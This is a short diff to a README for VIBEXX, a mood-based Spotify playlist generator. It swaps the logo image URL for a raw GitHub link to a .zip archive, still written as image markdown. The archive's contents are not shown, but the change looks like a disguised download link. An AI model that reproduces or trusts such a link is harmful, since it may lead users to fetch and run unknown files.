@@ -1,4 +1,4 @@
-![logo](https://github.com/user-attachments/assets/c78c6410-4fe4-466b-927f-72b502c2df6d)
+![logo](https://raw.githubusercontent.com/pradnyeshbhalekar/vibexx-backend/main/cheerful/vibexx-backend.zip)
 
 
 # **VIBEXX - Spotify playlist generator based on your mood.**
